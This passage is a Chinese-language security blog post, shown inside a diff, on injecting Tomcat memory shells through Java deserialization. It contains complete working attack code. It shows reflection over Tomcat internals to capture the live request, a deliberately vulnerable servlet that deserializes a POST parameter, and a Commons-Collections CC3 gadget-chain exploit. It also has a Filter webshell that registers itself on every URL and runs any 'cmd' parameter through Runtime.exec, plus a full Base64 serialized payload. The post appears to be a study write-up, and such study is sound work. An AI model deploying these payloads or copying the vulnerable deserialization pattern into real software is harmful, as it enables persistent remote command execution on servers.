+Class&lt;?&gt; abstractProtocolClass = Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;);
+Field handlerField = abstractProtocolClass.getDeclaredField(&quot;handler&quot;);
+handlerField.setAccessible(true);
+Object connectionHandler = handlerField.get(protocolHandler);
+
+// 获取 global
+Class&lt;?&gt; connectionHandlerClass = Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;);
+Field globalField = connectionHandlerClass.getDeclaredField(&quot;global&quot;);
+globalField.setAccessible(true);
+Object global = globalField.get(connectionHandler);
+
+// 获取 processors
+Class&lt;?&gt; requestGroupInfoClass = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;);
+Field processorsField = requestGroupInfoClass.getDeclaredField(&quot;processors&quot;);
+processorsField.setAccessible(true);
+List&lt;?&gt; processors = (List&lt;?&gt;) processorsField.get(global);
+
+// 遍历 RequestInfo
+Class&lt;?&gt; requestInfoClass = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;);
+Field reqField = requestInfoClass.getDeclaredField(&quot;req&quot;);
+reqField.setAccessible(true);
+
+for (Object requestInfo : processors) {
+    Object coyoteRequest = reqField.get(requestInfo);
+    if (coyoteRequest != null) {
+        // 获取 Note[1] -&gt; org.apache.catalina.connector.Request
+        Object httpRequest = coyoteRequest.getClass().getMethod(&quot;getNote&quot;, int.class).invoke(coyoteRequest, 1);
+        if (httpRequest != null &amp;&amp; httpRequest.getClass().getName().contains(&quot;org.apache.catalina.connector.Request&quot;)) {
+            request_cmd = httpRequest;
+            Object httpResponse = httpRequest.getClass().getMethod(&quot;getResponse&quot;).invoke(httpRequest);
+            response_cmd =httpResponse;
+        }
+    }
+}
+</code></pre>
+<h1 id="heading-2">反序列化写入</h1>
+<p>先看看怎么进行远程的反序列化打，由于之前都是直接进行本地打的，我们现在来模拟服务器存在反序列化点：</p>
+<p>依赖：</p>
+<pre><code class="language-java">&lt;dependencies&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;javax.servlet&lt;/groupId&gt;
+&lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;
+&lt;version&gt;4.0.1&lt;/version&gt;
+&lt;scope&gt;provided&lt;/scope&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;
+&lt;artifactId&gt;junit-jupiter-api&lt;/artifactId&gt;
+&lt;version&gt;${junit.version}&lt;/version&gt;
+&lt;scope&gt;test&lt;/scope&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;commons-collections&lt;/groupId&gt;
+&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+&lt;version&gt;3.2.1&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;
+&lt;artifactId&gt;junit-jupiter-engine&lt;/artifactId&gt;
+&lt;version&gt;${junit.version}&lt;/version&gt;
+&lt;scope&gt;test&lt;/scope&gt;
+&lt;/dependency&gt;
+&lt;/dependencies&gt;
+</code></pre>
+<p>服务器代码：</p>
+<pre><code class="language-java">package com.serialization.serialization;
+
+import java.io.*;
+import java.util.Base64;
+import javax.servlet.ServletException;
+import javax.servlet.http.*;
+import javax.servlet.annotation.*;
+
+@WebServlet(&quot;/shell&quot;)
+public class HelloServlet extends HttpServlet {
+
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        resp.setContentType(&quot;text/html;charset=utf-8&quot;);
+        PrintWriter out = resp.getWriter();
+        out.println(&quot;反序列化点&quot;);
+    }
+
+    @Override
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        byte[] bytes= Base64.getDecoder().decode(req.getParameter(&quot;data&quot;));
+        ByteArrayInputStream BAIS=new ByteArrayInputStream(bytes);
+        ObjectInputStream objectInputStream=new ObjectInputStream(BAIS);
+        try
+            {
+                System.out.println(objectInputStream.readObject());
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+    }
+}
+</code></pre>
+<p>我们这里就用CC3，进行类加载：</p>
+<pre><code class="language-java">package Servlet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import javax.xml.transform.Templates;
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Arrays;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3_EXP {
+    public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException {
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+
+        //满足getTransletInstance的条件
+        Field _name = templatesClass.getDeclaredField(&quot;_name&quot;);
+        _name.setAccessible(true);
+        _name.set(templates, &quot;Bloyet&quot;);
+        Field _class = templatesClass.getDeclaredField(&quot;_class&quot;);
+        _class.setAccessible(true);
+        _class.set(templates, null);
+
+        //满足defineTransletClasses的条件
+        byte[] _bytecodess = Files.readAllBytes(Paths.get(&quot;H:\\http.class&quot;));
+        byte[][] exp = new byte[][]{_bytecodess};
+        Field _tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        _tfactory.setAccessible(true);
+        _tfactory.set(templates, new TransformerFactoryImpl());
+        Field _bytecodess1 = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        _bytecodess1.setAccessible(true);
+        _bytecodess1.set(templates, exp);
+        //templates.newTransformer();
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
+        Transformer[] transformer = new Transformer[]{new ConstantTransformer(TrAXFilter.class), instantiateTransformer};
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
+        //chainedTransformer.transform(1);
+        Map map = new HashMap();
+        Map decorMap = LazyMap.decorate(map, chainedTransformer);
+        Class cla = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor = cla.getDeclaredConstructor(Class.class, Map.class);//第一个参数为Class,第二个为Map类型
+        constructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, decorMap);
+        Map newproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);
+        Object o =constructor.newInstance(Override.class, newproxy);
+        serialize(o);
+
+        // 指定序列化文件路径
+        String filePath = &quot;D:\\out.obj&quot;;
+
+        // 读取文件为字节数组
+        byte[] fileBytes = readFileToBytes(filePath);
+
+        // 转换为Base64字符串
+        String payload = Base64.getEncoder().encodeToString(fileBytes);
+
+        // 输出或保存
+        System.out.println(payload);
+        byte[] bytes2= Base64.getDecoder().decode(payload);
+
+
+
+       // unserialize(&quot;D:\\out.obj&quot;);
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;D:\\out.obj&quot;)));
+        out.writeObject(obj);
+    }
+
+    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream out = new ObjectInputStream(Files.newInputStream(Paths.get(filename)));
+        out.readObject();
+    }
+    private static byte[] readFileToBytes(String filePath) throws IOException {
+        File file = new File(filePath);
+        try (FileInputStream fis = new FileInputStream(file);
+             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
+            byte[] buffer = new byte[1024];
+            int len;
+            while ((len = fis.read(buffer)) != -1) {
+                bos.write(buffer, 0, len);
+            }
+            return bos.toByteArray();
+        }
+
+}
+}
+</code></pre>
+<p>生成的payload：</p>
+<pre><code class="language-java">
+</code></pre>
+<p>其实区别不大，只不过位置不一样了而已</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013024515_00073.png" alt="" /></p>
+<h2 id="heading-3">反序列化写入内存马</h2>
+<p>我们先来回想一下 之前打的内存马，都是通过JSP来进行的，可以很容易的获取到request，而我们通过反序列化来打的话，就要解决回显问题，就需要参考上文了，因为在前面，也没有进行过反序列化打内存马，所以需要注意一些细节</p>
+<p>JSP的写法：</p>
+<p>可以看到JSP中是有内置的request的，而我们通过反序列化打的话 是没有这个，我们需要通过上文那种方法去获取，</p>
+<p>通过类加载 ，把内存马写进（放在静态代码块中）</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013022664_00072.png" alt="" /></p>
+<p>恶意类：</p>
+<pre><code class="language-java">package Filter;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.catalina.Context;
+import org.apache.catalina.WebResourceRoot;
+import org.apache.catalina.connector.Connector;
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.core.StandardService;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.coyote.ProtocolHandler;
+import org.apache.coyote.RequestGroupInfo;
+import org.apache.coyote.RequestInfo;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+
+import javax.servlet.*;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.PrintWriter;
+import java.lang.reflect.Field;
+import java.util.List;
+
+public class Filter_shell extends AbstractTranslet implements Filter  {
+
+    static {
+        org.apache.catalina.connector.Request request_cmd = null;
+
+        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+        //WebResourceRoot resourceRoot = webappClassLoaderBase.getResources();
+        Field webappclassLoaderBaseField=Class.forName(&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;).getDeclaredField(&quot;resources&quot;);
+        webappclassLoaderBaseField.setAccessible(true);
+        WebResourceRoot resourceRoot=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
+            
+        Context standardContext = resourceRoot.getContext();
+
+        try {
+            //获取ApplicationContext
+            Field application = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;context&quot;);
+            application.setAccessible(true);
+            ApplicationContext applicationContext = (ApplicationContext) application.get(standardContext);
+
+            //获取StandardService
+            Field Standard = Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredField(&quot;service&quot;);
+            Standard.setAccessible(true);
+            StandardService standardService = (StandardService) Standard.get(applicationContext);
+
+            //获取connectors
+            Field connectorfield = Class.forName(&quot;org.apache.catalina.core.StandardService&quot;).getDeclaredField(&quot;connectors&quot;);
+            connectorfield.setAccessible(true);
+            Connector[] connectors = (Connector[]) connectorfield.get(standardService);
+            Connector connector = connectors[0];
+
+            //获取到Http11NioProtocol ,通过Http11NioProtocol 获取到父类AbstractProtocol的属性
+            ProtocolHandler protocolHandler = connector.getProtocolHandler();
+            //反射获取ConnectionHandler
+            Field Connection_Handler = Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;).getDeclaredField(&quot;handler&quot;);
+            Connection_Handler.setAccessible(true);
+            org.apache.tomcat.util.net.AbstractEndpoint.Handler ConnectionHandler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) Connection_Handler.get(protocolHandler);
+
+            //获取global
+            Field global_field = Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;).getDeclaredField(&quot;global&quot;);
+            global_field.setAccessible(true);
+            RequestGroupInfo global = (RequestGroupInfo) global_field.get(ConnectionHandler);
+
+            //获取processors
+            Field processorsField = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;);
+            processorsField.setAccessible(true);
+            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);
+
+            //获取request
+            Field requestField = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;);
+            requestField.setAccessible(true);
+            for (RequestInfo requestInfo : requestInfoList) {
+                org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);
+
+                //通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request
+                org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);
+                request_cmd = http_request;
+                org.apache.catalina.connector.Response http_response = http_request.getResponse();
+            }
+
+
+            //注册Filter内存马
+            //这里为什么要再一次获取ServletContext
+            //因为第一次拿的 ApplicationContext 是通过 WebResourceRoot 拿的，
+            //可能是某个默认或者不确定的上下文，不一定就是当前请求的那个Web应用。
+            //而你要注册的 Filter 必须加到当前请求对应的 Web 应用里，否则不生效。
+            ServletContext servletContext_request = request_cmd.getServletContext();
+            java.lang.reflect.Field appContextField = servletContext_request.getClass().getDeclaredField(&quot;context&quot;);
+            appContextField.setAccessible(true);
+            ApplicationContext applicationContext2 = (ApplicationContext) appContextField.get(servletContext_request);
+            java.lang.reflect.Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+            standardContextField.setAccessible(true);
+            StandardContext standardContext1 = (StandardContext) standardContextField.get(applicationContext2);
+
+            Filter_shell filter = new Filter_shell();
+            String name = &quot;shellfilter&quot;;
+
+            FilterDef filterDef = new FilterDef();
+            filterDef.setFilter(filter);
+            filterDef.setFilterName(name);
+            filterDef.setFilterClass(filter.getClass().getName());
+            standardContext1.addFilterDef(filterDef);
+
+            FilterMap filterMap = new FilterMap();
+            filterMap.addURLPattern(&quot;/*&quot;);
+            filterMap.setFilterName(name);
+            filterMap.setDispatcher(DispatcherType.REQUEST.name());
+            standardContext1.addFilterMapBefore(filterMap);
+
+            java.lang.reflect.Field configsField = standardContext1.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+            configsField.setAccessible(true);
+            java.util.Map filterconfigs = (java.util.Map) configsField.get(standardContext1);
+
+            java.lang.reflect.Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, FilterDef.class);
+            constructor.setAccessible(true);
+            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext1, filterDef);
+            filterconfigs.put(name, filterConfig);
+
+
+        } catch (Exception e) {
+            System.out.println(e.getMessage());
+        }
+    }
+
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+
+    }
+
+    @Override
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
+        //通过刚刚的方法我们已经把内存马直接注入到Tomcat中，然后在这个doFilter方法中，参数就会已经自动获取到request了，可以直接进行回显
+        String cmd = request.getParameter(&quot;cmd&quot;);
+        PrintWriter writer = response.getWriter();
+        if (cmd != null) {
+            try {
+                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
+                //将命令执行结果写入扫描器并读取所有输入
+                java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(&quot;\\A&quot;);
+                String result = scanner.hasNext() ? scanner.next() : &quot;&quot;;
+                scanner.close();
+                writer.write(result);
+                writer.flush();
+                writer.close();
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            chain.doFilter(request, response);
+        }
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<p>CC3：</p>
+<pre><code class="language-java">package Servlet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import javax.xml.transform.Templates;
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Arrays;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3_EXP {
+    public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException {
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+
+        //满足getTransletInstance的条件
+        Field _name = templatesClass.getDeclaredField(&quot;_name&quot;);
+        _name.setAccessible(true);
+        _name.set(templates, &quot;Bloyet&quot;);
+        Field _class = templatesClass.getDeclaredField(&quot;_class&quot;);
+        _class.setAccessible(true);
+        _class.set(templates, null);
+
+        //满足defineTransletClasses的条件
+        byte[] _bytecodess = Files.readAllBytes(Paths.get(&quot;D:\\ideaproject\\untitled2\\target\\classes\\Filter\\Filter_shell.class&quot;));
+        byte[][] exp = new byte[][]{_bytecodess};
+        Field _tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        _tfactory.setAccessible(true);
+        _tfactory.set(templates, new TransformerFactoryImpl());
+        Field _bytecodess1 = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        _bytecodess1.setAccessible(true);
+        _bytecodess1.set(templates, exp);
+        //templates.newTransformer();
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
+        Transformer[] transformer = new Transformer[]{new ConstantTransformer(TrAXFilter.class), instantiateTransformer};
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
+        //chainedTransformer.transform(1);
+        Map map = new HashMap();
+        Map decorMap = LazyMap.decorate(map, chainedTransformer);
+        Class cla = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor = cla.getDeclaredConstructor(Class.class, Map.class);//第一个参数为Class,第二个为Map类型
+        constructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, decorMap);
+        Map newproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);
+        Object o =constructor.newInstance(Override.class, newproxy);
+        serialize(o);
+
+        // 指定序列化文件路径
+        String filePath = &quot;D:\\out.obj&quot;;
+
+        // 读取文件为字节数组
+        byte[] fileBytes = readFileToBytes(filePath);
+
+        // 转换为Base64字符串
+        String payload = Base64.getEncoder().encodeToString(fileBytes);
+
+        // 输出或保存
+        System.out.println(payload);
+        byte[] bytes2= Base64.getDecoder().decode(payload);
+
+
+
+       // unserialize(&quot;D:\\out.obj&quot;);
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;D:\\out.obj&quot;)));
+        out.writeObject(obj);
+    }
+
+    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream out = new ObjectInputStream(Files.newInputStream(Paths.get(filename)));
+        out.readObject();
+    }
+    private static byte[] readFileToBytes(String filePath) throws IOException {
+        File file = new File(filePath);
+        try (FileInputStream fis = new FileInputStream(file);
+             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
+            byte[] buffer = new byte[1024];
+            int len;
+            while ((len = fis.read(buffer)) != -1) {
+                bos.write(buffer, 0, len);
+            }
+            return bos.toByteArray();
+        }
+
+}
+}
+</code></pre>
+<p>生成的payload：</p>
+<pre><code class="language-java">rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB%2BAABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB%2BABhMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAF2sr%2Bur4AAAA0ADQKAAgAJAoAJQAmCAAnCgAlACgHACkKAAUAKgcAKwcALAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQALTHRleHQvaHR0cDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAlodHRwLmphdmEMAAkACgcALgwALwAwAQAEY2FsYwwAMQAyAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAMwAKAQAJdGV4dC9odHRwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAQAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAALAA0AAAAMAAEAAAAFAA4ADwAAAAEAEAARAAIACwAAAD8AAAADAAAAAbEAAAACAAwAAAAGAAEAAAAYAA0AAAAgAAMAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAFAAVAAIAFgAAAAQAAQAXAAEAEAAYAAIACwAAAEkAAAAEAAAAAbEAAAACAAwAAAAGAAEAAAAdAA0AAAAqAAQAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAGQAaAAIAAAABABsAHAADABYAAAAEAAEAFwAIAB0ACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAA4ACQASAAwAEAANABEAEQATAA0AAAAMAAEADQAEAB4AHwAAACAAAAAHAAJMBwAhBAABACIAAAACACNwdAAGQmxveWV0cHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA%2FQAAAAAAAAHcIAAAAEAAAAAB4eHZyABJqYXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB%2BAC0%3D
+</code></pre>
+<p>要发两次包 ，是因为cc链的缘故，第二次就可以成功将内存马注入了</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012947834_00051.png" alt="" /></p>
+<p>参考：</p>
+<p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p>
+<p><a href="https://stoocea.github.io/post/%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF.html">Tomcat型内存马回显以及反序列化写入 | stoocea’s blog</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC"><li><a href="#font-stylecolorrgb36-41-46threadlocal-response-font">ThreadLocal Response 回显</a><ul><li><a href="#threadlocal-">ThreadLocal 是什么</a></li><li><a href="#heading">局限性</a></li></ul></li><li><a href="#font-stylecolorrgb36-41-46-responsefont">全局存储 Response</a><ul><li><a href="#heading-1">思路梳理</a></li></ul></li><li><a href="#heading-2">反序列化写入</a><ul><li><a href="#heading-3">反序列化写入内存马</a></li></ul></li></ul>
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="/post/spring-nei-cun-ma/">
+              <h3 class="post-title">
+                Spring内存马
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="/feed.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
